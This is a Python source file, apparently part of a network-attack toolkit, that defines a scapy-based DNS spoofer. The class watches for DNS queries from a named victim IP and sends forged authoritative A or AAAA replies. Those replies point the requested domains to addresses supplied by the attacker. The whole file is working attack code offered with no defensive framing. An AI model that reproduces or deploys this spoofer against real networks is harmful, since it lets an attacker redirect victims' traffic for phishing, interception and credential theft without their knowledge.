from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
from scapy.layers.inet6 import IPv6


class DNSSpoofer:
    def __init__(self, interface, victim_ip, dns_mapping, attacker_ip, attacker_ipv6, logger):
        self.interface = interface
        self.victim_ip = victim_ip
        self.attacker_ip = attacker_ip
        self.attacker_ipv6 = attacker_ipv6
        self.dns_mapping = dns_mapping  # { "example.com": "1.2.3.4" }
        self.logger = logger
        self.running = False

    def start(self):
        self.running = True

    def stop(self):
        self.running = False

    def log(self, msg):
        if self.logger:
            self.logger(msg)
        else:
            print(msg)

    def _get_src_ip(self, packet):
        if packet.haslayer(IP):
            return packet[IP].src, IP
        if packet.haslayer(IPv6):
            return packet[IPv6].src, IPv6
        return None, None

    def _dns_filter(self, packet):
        try:
            # Basic DNS query validation
            if not (
                packet.haslayer(DNS) and
                packet[DNS].qr == 0 and
                packet.haslayer(UDP) and
                packet[UDP].dport == 53 and
                packet.haslayer(DNSQR)
            ):
                # self.logger("No DNS query")
                return False

            src_ip, ip_layer = self._get_src_ip(packet)
            if src_ip != self.victim_ip:
                self.logger("not correct IP")
                return False

            qname = packet[DNSQR].qname
            domain = (
                qname.decode("utf-8", errors="ignore").rstrip(".")
                if isinstance(qname, bytes)
                else str(qname).rstrip(".")
            )

            qtype = packet[DNSQR].qtype
            spoof_ip = self.dns_mapping.get(domain)

            if not spoof_ip:
                self.logger(f"not spoof IP for {domain}")
                return False

            # Determine record type
            if qtype == 1:  # A record
                rdata = spoof_ip
                rr_type = "A"
            elif qtype == 28 and self.attacker_ipv6:  # AAAA record
                rdata = self.attacker_ipv6
                rr_type = "AAAA"
            else:
                self.logger("not record type")
                return False

            # Build response
            ip_response = ip_layer(
                dst=packet[ip_layer].src,
                src=packet[ip_layer].dst
            )

            dns_reply = (
                ip_response /
                UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
                DNS(
                    id=packet[DNS].id,
                    qr=1,
                    aa=1,
                    qd=packet[DNS].qd,
                    an=DNSRR(
                        rrname=packet[DNSQR].qname,
                        type=rr_type,
                        ttl=300,
                        rdata=rdata
                    )
                )
            )

            send(dns_reply, iface=self.interface, verbose=0)
            return True

        except Exception as e:
            self.logger(f"DNS filter error: {e}")
            return False